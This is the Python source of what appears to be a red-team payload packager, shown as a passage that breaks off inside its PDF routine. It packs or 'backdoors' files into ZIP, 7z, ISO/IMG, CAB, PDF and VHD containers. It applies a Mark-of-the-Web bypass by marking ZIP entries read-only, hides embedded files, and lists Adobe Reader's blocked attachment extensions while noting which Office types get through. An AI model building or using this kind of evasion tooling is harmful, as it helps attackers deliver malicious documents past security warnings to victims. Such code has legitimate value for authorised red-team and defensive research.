#!/usr/bin/python3
#
# Requirements:
# - zipfile2
# - pyminizip
# - py7zr
# - pycdlib
# - cabarchive
# - pypdf2
#

import os, sys, re
import glob
import string
import random
import base64
import shutil
import zipfile
import time
import tempfile
import pyminizip
import py7zr
import pycdlib
import cabarchive
import traceback
import csv
import subprocess
import ctypes
#import libarchive

from io import StringIO

from PyPDF2 import PdfFileReader, PdfFileWriter
from PyPDF2.generic import DecodedStreamObject, NameObject, DictionaryObject, createStringObject, ArrayObject

try:
    from cStringIO import StringIO as BytesIO
except ImportError:
    from io import BytesIO

try:
    import msilib
    MSILIB_LOADED = True
except ImportError:
    MSILIB_LOADED = False


def getFactoryPath(path, name = ''):
    p = os.path.abspath(os.path.join(os.path.abspath(os.path.dirname(__file__)), '..' + os.sep + path))
    if name:
        p = os.path.abspath(os.path.join(p, name))

    if not os.path.isfile(p) and not os.path.isdir(p):
        raise FileNotFoundError(f'[!] FATAL ERROR: There is no such file: getFactoryPath("{path}", "{name}"): {p}')
    
    return p

class Packager:
    formatsMap = {
        # Working fine
        'zip' : 'zipfile',
        '7z'  : '7zip',
        'iso' : 'iso',
        'img' : 'iso',
        'cab' : 'cabinet',
        'pdf' : 'pdf',
        'vhd' : 'vhd',
        'vhdx' : 'vhd',
        
        # In progress...
        #'msi' : 'msifile',

        # TODO
        #'tar' : 'tar',      # libarchive
        #'cpio' : 'cpio',    # libarchive
        #'pax' : 'pax',      # libarchive
        #'xar' : 'xar',      # libarchive
        #'ar' : 'ar',        # libarchive
        #'mtree' : 'mtree',  # libarchive
        #'shar' : 'shar',    # libarchive

        # IDEAS
        #'tar.gz' : 'targz',
        #'cpgz' : 'cpgz',
        #'uu' : 'uu',
        #'lha' : 'lha',

        # No easy way to implement these
        #'rar' : 'rar',
    }

    #
    # Adobe Acrobat reader will prevent user from opening embedded files in PDF when they have
    # blacklisted extension, as specified in registry key:
    #   HKLM\SOFTWARE\Policies\Adobe\Acrobat Reader\DC\FeatureLockDown\cDefaultLaunchAttachmentPerms
    #
    # The message will be:
    #   "Adobe Acrobat cannot open the file attachment because your PDF file attachment 
    #    settings do not allow this type of file to be opened."
    #
    # However .doc/.xls work like a charm ;-)
    # 
    AdobeAcrobatReader_ExtensionsBlacklist = [
        '.acm', '.ad', '.ade', '.adp', '.air', '.app', '.application', '.appref-ms', '.arc', '.arj',
        '.asa', '.asp', '.aspx', '.asx', '.ax', '.bas', '.bat', '.bz', '.bz2', '.cab', '.cer', '.cfg',
        '.chi', '.chm', '.class', '.class', '.clb', '.cmd', '.cnt', '.cnv', '.com', '.command', '.cpl',
        '.cpx', '.crt', '.crx', '.csh', '.der', '.desklink', '.desktop', '.dll', '.drv', '.exe', '.fdf',
        '.fon', '.fxp', '.gadget', '.glk', '.grp', '.gz', '.hex', '.hlp', '.hqx', '.hta', '.htt', '.ime',
        '.inf', '.ini', '.ins', '.isp', '.its', '.jar', '.jnlp', '.job', '.js', '.jse', '.ksh', '.library-ms',
        '.lnk', '.local', '.lzh', '.mad', '.maf', '.mag', '.mam', '.manifest', '.mapimail', '.maq', '.mar',
        '.mas', '.mat', '.mau', '.mav', '.maw', '.mda', '.mdb', '.mde', '.mdt', '.mdw', '.mdz', '.mmc',
        '.mof', '.msc', '.msh', '.msh1', '.msh1xml', '.msh2', '.msh2xml', '.mshxml', '.msi', '.msp',
        '.mst', '.mui', '.mydocs', '.nls', '.ocx', '.ops', '.pcd', '.pdf', '.perl', '.pi', '.pif', '.pkg',
        '.pl', '.plg', '.prf', '.prg', '.ps1', '.ps1xml', '.ps2', '.ps2xml', '.psc1', '.psc2', '.pst', '.py',
        '.pyc', '.pyd', '.pyo', '.rar', '.rb', '.reg', '.scf', '.scr', '.sct', '.sct', '.sea', '.search-ms', '.searchConnector-ms',
        '.shb', '.shs', '.sit', '.sys', '.tar', '.taz', '.term', '.tgz', '.tlb', '.tmp', '.tool', '.tsp',
        '.url', '.vb', '.vbe', '.vbs', '.vsmacros', '.vss', '.vst', '.vsw', '.vxd', '.webloc', '.website',
        '.ws', '.wsc', '.wsf', '.wsh', '.xbap', '.xnk', '.xpi', '.z', '.zfsendtotarget', '.zip', '.zlo', '.zoo',

        # Additional list of extensions:
        '.docm', 
        '.xlsm', 
        '.xlam', 
        '.xltm', 
        '.dotm', 
        '.ppam', 
        '.pptm', 
        '.ppsm',
        '.potm',
    ]

    SupportedOfficeExtensions = [
        'docm', 'doc', 'xls', 'xlsm', 'rtf', 'xlam', 'xla', 'xlt', 'xltm', 'xlsb',
        'dot', 'dotm', 'ppam', 'pptm', 'ppsm', 'potm', 'mpp', 'mpt', 'mpx',
        'vdw', 'vsd', 'vsdm', 'vss', 'vssm', 'vstm', 'vst', 'mdb', 'accde',
        'docx', 'xlsx', 'pptx'
    ]

    diskpartCreateVHD = getFactoryPath('templates/diskpart-create-vhd.txt')
    diskpartDetachVHD = getFactoryPath('templates/diskpart-detach-vhd.txt')
    diskpartMountVHD = getFactoryPath('templates/diskpart-mount-vhd.txt')
    getMountedVHDDrive = getFactoryPath('templates/Get-MountedVHDDrive.ps1')

    def __init__(self, logger, options):
        self.logger = logger
        self.options = options
        self.zip_motw_bypass_warning_once = False

        opts = {
            'backdoor' : '',
            'filename' : '',
            #'password' : '',
        }

        opts.update(self.options)

    @staticmethod
    def isOfficeDocumentExtension(infile):
        filename, fileext = os.path.splitext(infile.lower())
        fileext = fileext[1:]

        return fileext in Packager.SupportedOfficeExtensions

    @staticmethod
    def isFileExtensionSupported(infile):
        if Packager.getFormat(infile) != '':
            return True
        return False

    @staticmethod
    def getFormat(filepath):
        filename, fileext = os.path.splitext(filepath.lower())
        fileext = fileext[1:]

        if fileext in Packager.formatsMap.keys():
            return Packager.formatsMap[fileext]

        return ''

    @staticmethod
    def checkFilenameAgainstWildcard(filename, wildcard):
        rex = wildcard.replace('*', '.*').replace('?', '.')
        return re.match(rex, filename, re.I) is not None

    @staticmethod
    def shell(cmd, cwd = ''):
        CREATE_NO_WINDOW = 0x08000000
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = subprocess.SW_HIDE

        if cwd == '':
            cwd = os.getcwd()

        outs = ''
        errs = ''
        proc = subprocess.Popen(
            cmd,
            cwd = cwd,
            shell=True, 
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            startupinfo=si, 
            creationflags=CREATE_NO_WINDOW
        )
        try:
            outs, errs = proc.communicate(timeout=60)
            proc.wait()

        except subprocess.TimeoutExpired:
            proc.kill()
            outs, errs = proc.communicate()

        status = outs.decode(errors='ignore').strip()

        if len(errs) > 0:
            status += errs.decode(errors='ignore').strip()

        return status

    def package(self, infile, outfile, outputFormat):
        if not outputFormat:
            self.logger.fatal('Output format could not be recognized. Make sure it is one of following: ' 
                + ', '.join(Packager.formatsMap.keys()))

        elif outputFormat == 'auto':
            if len(outfile) > 0:
                outputFormat = Packager.getFormat(outfile)
            elif 'out_format' in self.options.keys() and len(self.options['out_format']) > 0:
                outputFormat = Packager.getFormat(self.options['out_format'])
            else:
                self.logger.fatal('Output format could not be recognized. Make sure it is one of following: ' 
                    + ', '.join(Packager.formatsMap.keys()))

        self.outputFormat = outputFormat
        self.backdoorFile = None
        self.password = None
        self.hide = ""
        self.fileName = os.path.basename(infile)
        tmpdir = None
        output = False

        if 'filename' in self.options.keys() and len(self.options['filename']) > 0:
            self.fileName = self.options['filename']
            self.logger.info(f'Will package input file into output archive under name:')
            self.logger.info(f'\t{os.path.basename(infile)} => {os.path.basename(self.fileName)}\n', color='magenta')

            tmpdir = tempfile.TemporaryDirectory()
            tmp = os.path.join(tmpdir.name, self.fileName)
            shutil.copy(infile, tmp)
            infile = tmp

        if 'password' in self.options.keys() and len(self.options['password']) > 0:
            self.password = self.options['password']
            self.logger.info(f'Will encrypt output archive with password:')
            self.logger.info('\t' + self.password + '\n', color='magenta')

        if os.path.isfile(outfile):
            self.logger.dbg('Output file already exists. Removing it...')
            os.remove(outfile)

        if 'backdoor' in self.options.keys() and len(self.options['backdoor']) > 0:
            self.backdoorFile = self.options['backdoor']
            shutil.copy(self.backdoorFile, outfile)

            self.logger.info(f'Will backdoor existing archive:')
            self.logger.info('\t' + self.backdoorFile + '\n', color='magenta')

        if 'hide' in self.options.keys() and len(self.options.get('hide', '')) > 0:
            hide = self.options.get('hide', '')

            if ',' in hide:
                self.hide = []

                for h in hide.split(','):
                    h = h.strip()
                    if h[0] == '"' and h[-1] == '"':
                        h = h[1:-1]

                    self.hide.append(h)
            else:
                self.hide = [hide, ]

        if outputFormat == 'iso':
            output = self.packIntoISO(infile, outfile)

        elif outputFormat == 'cabinet':
            output = self.packIntoCAB(infile, outfile)

        elif outputFormat == 'vhd':
            output = self.packIntoVHD(infile, outfile)

        else:
            if os.path.isfile(infile):
                output = self.doThePacking(infile, outfile, outputFormat)
        
            elif os.path.isdir(infile):
                output = True

                for fname in glob.iglob(infile + '/**/*', recursive=True):
                    infile1 = fname
                    if os.path.isdir(infile1):
                        continue
                    local_path = os.path.relpath(infile1, start=infile)
                    
                    output &= self.doThePacking(infile1, outfile, outputFormat, local_path)

                    if not self.backdoorFile:
                        self.backdoorFile = outfile

        if tmpdir:
            tmpdir.cleanup()

        return output and os.path.isfile(outfile)

    def doThePacking(self, infile, outfile, outputFormat, local_path=None):
        output = False

        if outputFormat == 'zipfile':
            output = self.packIntoZIP(infile, outfile, local_path)

        elif outputFormat == '7zip':
            output = self.packInto7ZIP(infile, outfile, local_path)

        elif outputFormat == 'pdf':
            output = self.packIntoPDF(infile, outfile)

        elif outputFormat == 'msi':
            output = self.packIntoMSI(infile, outfile)

        else:
            self.logger.fatal(f'Unsupported archive format: {outputFormat}!')

        return output

    def applyZipAttributes(self, infile, outfile, attribs):
        if len(attribs) == 0:
            return
        
        self.logger.info(f'Applying file attributes to {len(attribs)} files...')
        
        tmpdst = ''
        with tempfile.NamedTemporaryFile() as f:
            tmpdst = f.name + os.path.splitext(outfile)[1]

        shutil.copyfile(outfile, tmpdst)
        
        outzip = zipfile.ZipFile(tmpdst, 'w')
        inzip = zipfile.ZipFile(outfile)
        changed = False

        for i in inzip.infolist():
            for k, v in attribs.items():
                if Packager.checkFilenameAgainstWildcard(i.filename, k):
                    changed = True
                    x = i.external_attr
                    i.external_attr = i.external_attr | v
                    if i.external_attr != x:
                        self.logger.dbg(f'\tSet ZIPDIRENTRY.external_attr from 0x{x:08x} to 0x{i.external_attr:08x} on {i.filename}')
                    break

            buf = inzip.read(i.filename)
            outzip.writestr(i, buf)

        outzip.close()
        inzip.close()

        if changed:
            os.remove(outfile)
            shutil.move(tmpdst, outfile)
        else:
            os.remove(tmpdst)

    def packIntoZIP(self, infile, outfile, local_path=None):
        try:
            mode = 'w'
            if self.backdoorFile:
                mode = 'a'

            with zipfile.ZipFile(outfile, mode) as container:
                with open(infile, 'rb') as f:
                    container.write(infile, local_path or os.path.basename(infile))

            zipAttribs = {}

            if not self.options.get('zip_noreadonly', False):
                if os.path.isfile(infile) and self.isFileExtensionSupported(infile):
                    self.logger.info(f'Applying MOTW bypass on ZIP by setting {os.path.basename(infile)} as Read-Only upon extraction.')

                    if not self.zip_motw_bypass_warning_once:
                        self.logger.text('[-] WARNING: ZIP Read-Only MOTW bypass was fixed in MS Office 365 2208+ (or somewhere around that version)', color='yellow')
                        self.zip_motw_bypass_warning_once = True
                
                    basename = os.path.basename(infile)
                    zipAttribs[basename] = 0x1 # FILE_ATTRIBUTE_READONLY

            if type(self.hide) is list and len(self.hide) > 0:
                for hideFile in self.hide:
                    if hideFile in zipAttribs:
                        zipAttribs[hideFile] |= 0x2 # FILE_ATTRIBUTE_HIDDEN
                    else:
                        zipAttribs[hideFile] = 0x2

            self.applyZipAttributes(infile, outfile, zipAttribs)

            if self.password:
                f = tempfile.NamedTemporaryFile(delete=False)
                self.logger.info('Got file packed into ZIP. Now we extract that zip to re-package it into ZIP with password.')
                shutil.move(outfile, f.name)

                with tempfile.TemporaryDirectory() as tmpdir:
                    with zipfile.ZipFile(f.name) as zf:
                        zf.extractall(path=tmpdir, pwd=self.password.encode())

                    f.close()
                    os.unlink(f.name)

                    infiles = []
                    outfiles = []

                    for fname in glob.iglob(tmpdir + '/**/**', recursive=True):
                        if os.path.isdir(fname): 
                            continue

                        infiles.append(fname)
                        base = fname.replace(tmpdir, '/')
                        if base == '\\' or base == '/': continue

                        outn = base.replace('\\', '/').replace('\\\\', '/').replace('//', '/')
                        if not outn.startswith('/'):
                            outn = '/' + outn

                        basename = os.path.basename(fname)
                        outn = outn.replace(basename, '')

                        outfiles.append(outn)

                        fname1 = fname.replace(tmpdir, '')
                        self.logger.dbg(f'{fname1} => {outn}{basename}')

                    pyminizip.compress_multiple(infiles, outfiles, outfile, self.password, 5)

                if os.path.isdir(tmpdir):
                    shutil.rmtree(tmpdir)

                if os.path.isfile(f.name):
                    os.unlink(f.name)

            if self.backdoorFile:
                self.logger.text(f'[+] Backdoored existing ZIP with specified input file', color='green')
            else:
                self.logger.text('[+] File packed into ZIP.', color='green')

            return True

        except Exception as e:
            self.logger.err(f'Could not package input file into ZIP! Exception: {e}')
            raise

            return False

    def packInto7ZIP(self, infile, outfile, local_path=None):
        try:
            mode = 'w'
            if self.backdoorFile:
                mode = 'a'

            pwd = None
            if self.password:
                pwd = self.password

            with py7zr.SevenZipFile(outfile, mode=mode, password=pwd) as container:
                with open(infile, 'rb') as f:
                    container.write(infile, local_path or os.path.basename(infile))

            if self.backdoorFile:
                self.logger.text('[+] Backdoored existing 7zip with specified input file.', color='green')
            else:
                self.logger.text('[+] File packed into 7zip.', color='green')

            return True

        except Exception as e:
            self.logger.err(f'Could not package input file into 7zip! Exception: {e}')
            raise

            return False

    def packIntoMSI(self, infile, outfile):
        raise Exception("MSI files are not yet supported.")

        if not MSILIB_LOADED:
            self.logger.fatal('Could not import "msilib"! Make sure your Python3 supports msilib package.')

#        try:
#            if self.backdoorFile:
#                raise Exception("Backdooring MSI files is currently not supported.")
#
#            msi = msilib.OpenDatabase(outfile, msilib.MSIDBOPEN_CREATEDIRECT)
#            name = 'foobar'
#            schema = msilib.schema
#            ProductName = 'foobar' 
#            ProductCode = 'foobar'
#            ProductVersion = '1.0'
#            Manufacturer = 'foobar'
#
#            db = msi.init_database(name, schema, ProductName, ProductCode, ProductVersion, Manufacturer)
#            msi.add_data(db, 'File')
#
#            if self.backdoorFile:
#                self.logger.text('[+] Backdoored existing MSI with specified input file.', color='green')
#            else:
#                self.logger.text('[+] File packed into MSI.', color='green')
#
#            return True
#
#        except Exception as e:
#            self.logger.err(f'Could not package input file into MSI! Exception: {e}')
#            raise
#
#            return False

    def packIntoVHD(self, infile, outfile):
        diskpartFile = None
        diskpartFile2 = None
        vhdFile = None
        outfile = os.path.abspath(outfile)

        if os.name != 'nt':
            self.logger.fatal('VHD packaging works only on Windows.')

        if self.password:
            self.logger.fatal('VHD files do not support password encryption.')

        if not ctypes.windll.shell32.IsUserAnAdmin():
            self.logger.fatal('You need to run this program as Local Administrator. This is required to make DISKPART create & mount VHD!')

        try:
            mount = False
            vhdsize = 1024
            vhdletter = ''
            vhdfs = 'fat32'

            if os.path.isfile(outfile):
                self.logger.info(f'Removing existing VHD file: {outfile}')
                os.unlink(outfile)

            if self.backdoorFile:
                template = ''

                shutil.copy(self.backdoorFile, outfile)

                if 'vhd_letter' in self.options.keys() and self.options['vhd_letter'] and self.options['vhd_letter'] != '':
                    vhdletter = self.options['vhd_letter']

                else:
                    out = Packager.shell('wmic LOGICALDISK LIST BRIEF /format:csv')
                    f = StringIO(out)
                    reader = csv.reader(f, delimiter=',')

                    lettersOccupied = set()

                    for row in reader:
                        if row[1].lower() == 'deviceid': 
                            continue

                        lettersOccupied.add(row[1].lower().replace(':',''))

                    self.logger.info('Drive letters currently occupied:\n\t' + '\n\t'.join([x.upper() for x in lettersOccupied]))

                    diff = set(list(string.ascii_lowercase)) - lettersOccupied
                    vhdletter = random.choice(list(diff))

                self.logger.info(f'Will assign VHD letter :\t{vhdletter.upper()}:')

                with open(Packager.diskpartMountVHD, 'r') as f:
                    template = f.read()

                diskpartFile = tempfile.NamedTemporaryFile(delete=False)
                diskpartPath = diskpartFile.name + '.txt'

                template = template.replace('<<<FILE>>>', outfile)
                template = template.replace('<<<DRIVE_LETTER>>>', vhdletter)

                with open(diskpartPath, 'w') as f:
                    f.write(template)

                diskpartFile.close()

                self.logger.dbg(f'''
    DISKPART commands ({diskpartPath}):
    ---------------------------------------
    {template}
    ---------------------------------------
    ''')

                self.logger.info('Mounting VHD file...')

                out = Packager.shell(cmd=f'diskpart /s "{diskpartPath}"')
                self.logger.dbg(f'''DISKPART VHD creation returned:
    ---------------------------------------
    {out}
    ---------------------------------------
    ''')

                dstpath = f'{vhdletter.upper()}:\\'

                if os.path.isdir(dstpath):
                    self.logger.text(f'[+] Mounted supplied VHD file on {dstpath}', color='green')
                    mount = True
                else:
                    self.logger.text(f'[-] Could not mount provided VHD file on {vhdletter.upper()} because system reserved another letter for it.', color='yellow')
                    self.logger.text('Finding what letter that is...')

                    code = ''
                    with open(Packager.getMountedVHDDrive) as f:
                        g = tempfile.NamedTemporaryFile(delete = False)
                        ps1 = g.name + '.ps1'
                        with open(ps1, 'w') as script:
                            script.write(f.read())

                        out = Packager.shell(f'powershell -c ". {ps1} ; (Get-MountedVHDDrive)[0].DeviceID"')

                        os.unlink(ps1)

                        if len(out) == 0:
                            self.logger.err('Could not locate where the system mounted supplied VHD! Provide the correct drive letter via --vhd-letter')
                            return False

                        else:
                            vhdletter = out.replace(':', '')
                            dstpath = f'{vhdletter.upper()}:\\'

                            if os.path.isdir(dstpath):
                                self.logger.text(f'[.] System mounted VHD onto {dstpath}', color='magenta')
                            else:
                                self.logger.err(f'Could not mount provided VHD file on {vhdletter.upper()}!')
                                return False

            else:
                if 'vhd_size' in self.options.keys() and self.options['vhd_size']:
                    vhdsize = self.options['vhd_size']

                if 'vhd_filesystem' in self.options.keys() and self.options['vhd_filesystem']:
                    vhdfs = self.options['vhd_filesystem']

                if 'vhd_letter' in self.options.keys() and self.options['vhd_letter'] and self.options['vhd_letter'] != '':
                    vhdletter = self.options['vhd_letter']

                else:
                    out = Packager.shell('wmic LOGICALDISK LIST BRIEF /format:csv')
                    f = StringIO(out)
                    reader = csv.reader(f, delimiter=',')

                    lettersOccupied = set()

                    for row in reader:
                        if row[1].lower() == 'deviceid': 
                            continue

                        lettersOccupied.add(row[1].lower().replace(':',''))

                    self.logger.info('Drive letters currently occupied:\n\t' + '\n\t'.join([x.upper() for x in lettersOccupied]))

                    diff = set(list(string.ascii_lowercase)) - lettersOccupied
                    vhdletter = random.choice(list(diff))

                self.logger.info(f'Will create VHD of size:\t{vhdsize}MB (Dynamic)')
                self.logger.info(f'Will assign VHD letter :\t{vhdletter.upper()}:')
                self.logger.info(f'Will format VHD with   :\t{vhdfs.upper()}')

                template = ''
                with open(Packager.diskpartCreateVHD, 'r') as f:
                    template = f.read()

                diskpartFile = tempfile.NamedTemporaryFile(delete=False)
                diskpartPath = diskpartFile.name + '.txt'

                template = template.replace('<<<FILE>>>', outfile)
                template = template.replace('<<<SIZE_IN_MB>>>', str(vhdsize))
                template = template.replace('<<<DRIVE_LETTER>>>', vhdletter)
                template = template.replace('<<<FILESYSTEM>>>', vhdfs)

                with open(diskpartPath, 'w') as f:
                    f.write(template)

                diskpartFile.close()

                self.logger.dbg(f'''
    DISKPART commands ({diskpartPath}):
    ---------------------------------------
    {template}
    ---------------------------------------
    ''')

                self.logger.info('Creating VHD file...')

                out = Packager.shell(cmd=f'diskpart /s "{diskpartPath}"')
                self.logger.dbg(f'''DISKPART VHD creation returned:
    ---------------------------------------
    {out}
    ---------------------------------------
    ''')

                dstpath = f'{vhdletter.upper()}:\\'

                if os.path.isdir(dstpath):
                    self.logger.text(f'[+] Created & mounted VHD file on {dstpath}', color='green')
                    mount = True

                else:
                    self.logger.err(f'Could not create or mount VHD on letter {vhdletter.upper()}!')
                    return False

            self.logger.text('[.] Packing files into created VHD...')
            time.sleep(3)

            if os.path.isfile(infile):
                shutil.copy(infile, dstpath)

                self.logger.info('packed file:')
                self.logger.info(f'\t{infile} => {dstpath}')

            elif os.path.isdir(infile):
                errcount = 0

                for fname in glob.iglob(infile + '/**/**', recursive=True):
                    infile1 = fname
                    if os.path.isdir(infile1):
                        if errcount < 3:
                            self.logger.err('Creating subdirectories in VHD/VHDX is not supported! Will place nested files to volume\'s root.')
                            errcount += 1

                        continue

                    shutil.copy(infile1, dstpath)

                self.logger.info('packed directory:')
                self.logger.info(f'\t{infile} => {dstpath}')

            detachTemplate = ''
            with open(Packager.diskpartDetachVHD, 'r') as f:
                detachTemplate = f.read()

            diskpartFile2 = tempfile.NamedTemporaryFile(delete=False)
            diskpartDetachPath = diskpartFile2.name + '.txt'

            detachTemplate = detachTemplate.replace('<<<FILE>>>', outfile)
            detachTemplate = detachTemplate.replace('<<<DRIVE_LETTER>>>', vhdletter)
                
            with open(diskpartDetachPath, 'w') as f:
                f.write(detachTemplate)

            diskpartFile2.close()

            self.logger.text('[.] Detaching VHD file...')

            self.logger.dbg(f'''
DISKPART commands ({diskpartDetachPath}):
---------------------------------------
{detachTemplate}
---------------------------------------
''')

            out = Packager.shell(cmd=f'diskpart /s "{diskpartDetachPath}"')
            self.logger.dbg(f'''DISKPART VHD detach returned:
---------------------------------------
{out}
---------------------------------------
''')

            if not os.path.isdir(dstpath):
                self.logger.text(f'[+] Detached VHD file from {dstpath}', color='green')
                mount = False
            else:
                self.logger.err(f'Could not detach VHD file from {dstpath}')
                return False

            if os.path.isfile(outfile):
                if self.backdoorFile:
                    self.logger.text('[+] Backdoored existing VHD with specified input file.', color='green')
                else:
                    self.logger.text('[+] File packed into VHD.', color='green')
                
                return True
            
            else:
                self.logger.err('Could not package files into VHD! File does not exist!')
                return False

        except Exception as e:
            self.logger.err(f'Could not package input file into VHD! Exception: {e}')
            if 'access is denied' in str(e).lower():
                self.logger.err(f'Try changing VHD volume mount letter with --vhd-letter .')

            raise

            return False

        finally:
            if diskpartFile:
                try:
                    diskpartFile.close()
                except:
                    pass

                os.unlink(diskpartPath)

            if diskpartFile2:
                try:
                    diskpartFile2.close()
                except:
                    pass

                os.unlink(diskpartDetachPath)

            if mount:
                self.logger.err(f'WARNING! Your VHD file is still mounted on ({dstpath} / {vhdletter})! You will need to unmount it manually from Windows Explorer!')
                self.logger.err(f'''-----------------------------------------------------------
To manually detach VHD disk follow these from an elevated prompt:

cmd> diskpart
DISKPART> list vdisk

  VDisk ###  Disk ###  State                 Type       File
  ---------  --------  --------------------  ---------  ----
  VDisk 1    Disk 2    Attached not open     Expandable  {outfile}

DISKPART> select vdisk file={outfile}

DISKPART> detach vdisk
''')

    def collectIsoJolietFiles(self, iso, basedir = '/'):
        files = []
        for dirname, dirlist, filelist in iso.walk(joliet_path=basedir):
            print(f"Base: {basedir}, Dirname:", dirname, ", Dirlist:", dirlist, ", Filelist:", filelist)

            for file in filelist:
                if ';' in file:
                    file = file.split(';')[0]
                    self.logger.dbg(f'\tfile: {file}')

                if file.startswith('/'):
                    file = file[1:]

                files.append(('file', os.path.join(dirname, file)))

            for dirn in dirlist:
                self.logger.dbg(f'\tdir: {dirn}')
                dirn = os.path.join(basedir, dirn)
                files.append(('dir', dirn))
                files.extend(self.collectIsoJolietFiles(iso, dirn))

        return files

    def packIntoISO(self, infile, outfile):
        if infile.lower().endswith('.img'):
            self.logger.text('Will generate .IMG file that is in fact .ISO')

        try:
            if self.password:
                self.logger.fatal('Passwords are not supported by IMG/ISO files.')

            if self.backdoorFile:
                iso = pycdlib.PyCdlib()
                iso.open(self.backdoorFile)

                self.logger.dbg('ISO Joliet traversal:')

                files = self.collectIsoJolietFiles(iso)

                with tempfile.TemporaryDirectory() as tmpdir:
                    self.logger.info('Extracting files from ISO:')

                    localfiles = []

                    for f in files:
                        self.logger.info(f'\t- {f[0]}: {f[1]}')
                        
                        fn = f[1]
                        if fn.startswith('/'):
                            fn = fn[1:]

                        fn = fn.replace('/', os.sep)
                        lp = os.path.join(tmpdir, fn)
                        jf = f'/{f[1]};1'

                        self.logger.dbg(f'\t\tReading: {jf} => {lp}')
                        iso.get_file_from_iso(local_path=lp, joliet_path=jf)
                        localfiles.append((f[0], lp, f[1]))

                    iso.close()

                    if os.path.isfile(infile):
                        fn = os.path.basename(infile)
                        if self.fileName:
                            fn = self.fileName

                        self.logger.dbg(f'Adding new file to ISO:\n\t- {infile} => {fn}')

                        localfiles.append(('file', infile, fn))
                    else:
                        self.logger.dbg(f'Adding new files to ISO:')

                        for fname in glob.iglob(infile + '/**/**', recursive=True):
                            lf = fname.replace(infile, '')

                            if lf == '\\' or lf == '/': 
                                continue

                            if lf.endswith('/') or lf.endswith('\\'):
                                lf = lf[:-1]

                            if os.path.isdir(fname):
                                self.logger.dbg(f'\t- dir: {fname} => {lf}')
                                localfiles.append(('dir', fname, lf))
                            else:
                                self.logger.dbg(f'\t- file: {fname} => {lf}')
                                localfiles.append(('file', fname, lf))

                    iso2 = pycdlib.PyCdlib()
                    iso2.new(joliet=3)

                    self.logger.text('\nBurning files onto ISO:')

                    for f in localfiles:
                        jp = f[2]
                        if jp.startswith('/'):
                            jp = jp[1:]

                        if f[0] == 'file':
                            self.logger.dbg(f'\t- {f[0]}: {f[1]} ==> /{jp};1')
                            self.logger.text(f'\tAdding file: /{jp}')

                            iso2.add_file(f[1], joliet_path=f'/{jp};1')
                        else:
                            jp = jp.replace('\\', '/')
                            self.logger.dbg(f'\t- {f[0]}: {f[1]} ==> /{jp}')
                            self.logger.text(f'\tAdding dir : /{jp}')

                            iso2.add_directory(joliet_path=f'/{jp}')
                    
                    # Hide file(s) when backdooring existing iso file
                    if self.hide != '': 
                        if type(self.hide) is list:
                            for hideFile in self.hide:
                                self.logger.text(f'\tHiding file: //{hideFile}') 
                                iso2.set_hidden(joliet_path=f'/{hideFile};1')
                        else:
                            self.logger.text(f'\tHiding file: //{self.hide}') 
                            iso2.set_hidden(joliet_path=f'/{self.hide};1')

                    iso2.write(outfile)
                    iso2.close()

                return True

            else:
                iso = pycdlib.PyCdlib()
                iso.new(joliet=3)

                if os.path.isfile(infile):
                    filename = os.path.basename(infile)

                    self.logger.text(f'Burning file onto ISO:')
                    self.logger.text(f'\tAdding file: /{filename}')
                    iso.add_file(infile, joliet_path=f'/{filename};1')

                else:
                    self.logger.text(f'Burning files onto ISO:')
                    alreadyadded = set()

                    for fname in glob.iglob(infile + '/**/**', recursive=True):
                        lf = fname.replace(infile, '')

                        if lf == '\\' or lf == '/': 
                            continue

                        if lf.endswith('/') or lf.endswith('\\'):
                            lf = lf[:-1]

                        if os.path.isdir(fname):
                            lf = lf.replace('\\', '/')

                            if lf in alreadyadded or lf == '/' or lf == '':
                                continue

                            alreadyadded.add(lf)

                            self.logger.dbg(f'\t- dir: {fname} => /{lf}')
                            self.logger.text(f'\tAdding dir : /{lf}')
                            iso.add_directory(joliet_path=f'/{lf}')
                        
                        else:
                            lf = lf.replace('\\', '/')

                            if lf in alreadyadded:
                                continue

                            self.logger.dbg(f'\t- file: {fname} => /{lf};1')
                            alreadyadded.add(lf)

                            self.logger.text(f'\tAdding file: /{lf}')
                            iso.add_file(fname, joliet_path=f'/{lf};1')
                    
                # Hide file(s) when specified 
                if self.hide != '': 
                    if type(self.hide) is list:
                        for hideFile in self.hide:
                            self.logger.text(f'\tHiding file: //{hideFile}') 
                            iso.set_hidden(joliet_path=f'/{hideFile};1')
                    else:
                        self.logger.text(f'\tHiding file: //{self.hide}') 
                        iso.set_hidden(joliet_path=f'/{self.hide};1')

                iso.write(outfile)
                iso.close()

            if self.backdoorFile:
                self.logger.text('[+] Backdoored existing ISO with specified input file.', color='green')
            else:
                self.logger.text('[+] File packed into ISO.', color='green')

            return True

        except Exception as e:
            self.logger.err(f'Could not package input file into ISO! Exception: {e}')
            raise

            return False

    #
    # Source:
    #   https://stackoverflow.com/a/59085770
    #
    def pdfAppendAttachment(self, myPdfFileWriterObj, fname, fdata):
        # The entry for the file
        file_entry = DecodedStreamObject()
        file_entry.setData(fdata)
        file_entry.update({
            NameObject("/Type"): NameObject("/EmbeddedFile")
        })

        # The Filespec entry
        efEntry = DictionaryObject()
        efEntry.update({ 
            NameObject("/F"): file_entry 
        })

        filespec = DictionaryObject()
        filespec.update({
            NameObject("/Type"): NameObject("/Filespec"),
            NameObject("/F"): createStringObject(fname),
            NameObject("/EF"): efEntry
        })

        if "/Names" not in myPdfFileWriterObj._root_object.keys():
            self.logger.dbg('No files attached yet. Create the entry for the root, as it needs a reference to the Filespec')
            
            embeddedFilesNamesDictionary = DictionaryObject()
            embeddedFilesNamesDictionary.update({
                NameObject("/Names"): ArrayObject([createStringObject(fname), filespec])
            })

            embeddedFilesDictionary = DictionaryObject()
            embeddedFilesDictionary.update({
                NameObject("/EmbeddedFiles"): embeddedFilesNamesDictionary
            })

            myPdfFileWriterObj._root_object.update({
                NameObject("/Names"): embeddedFilesDictionary
            })

        else:
            self.logger.dbg('There are files already attached. Append the new file.')

            myPdfFileWriterObj._root_object["/Names"]["/EmbeddedFiles"]["/Names"].append(createStringObject(fname))
            myPdfFileWriterObj._root_object["/Names"]["/EmbeddedFiles"]["/Names"].append(filespec)


    def packIntoPDF(self, infile, outfile):
        try:
            fpath, fileext = os.path.splitext(infile.lower())

            if fileext in Packager.AdobeAcrobatReader_ExtensionsBlacklist:
                exts = '\t'

                num = 0

                for ext in sorted(Packager.AdobeAcrobatReader_ExtensionsBlacklist):
                    exts += ext + ', '

                    num += 1
                    if num % 15 == 0:
                        exts += '\n\t'

                self.logger.text(f'''
=====================================================
